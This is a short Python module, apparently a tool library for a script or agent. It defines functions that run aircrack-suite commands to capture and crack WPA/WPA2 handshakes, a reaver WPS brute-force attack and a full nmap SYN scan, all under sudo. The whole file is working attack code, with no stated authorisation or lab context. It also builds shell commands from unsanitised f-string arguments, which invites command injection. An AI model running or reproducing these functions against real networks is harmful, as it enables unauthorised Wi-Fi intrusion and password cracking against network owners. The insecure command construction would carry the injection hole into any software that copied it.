
from tools import run_command

def capture_handshake(bssid, channel, interface):
    """Capture WPA/WPA2 handshake."""
    return run_command(f"sudo airodump-ng --bssid {bssid} --channel {channel} -w capture {interface}mon")

def crack_wpa_handshake(wordlist, bssid):
    return run_command(f"sudo aircrack-ng -w {wordlist} -b {bssid} capture-01.cap")

def wps_attack(bssid, interface):
    return run_command(f"sudo reaver -i {interface}mon -b {bssid} -vv")

def port_scan(ip):
    return run_command(f"sudo nmap -Pn -sS -p- {ip}")
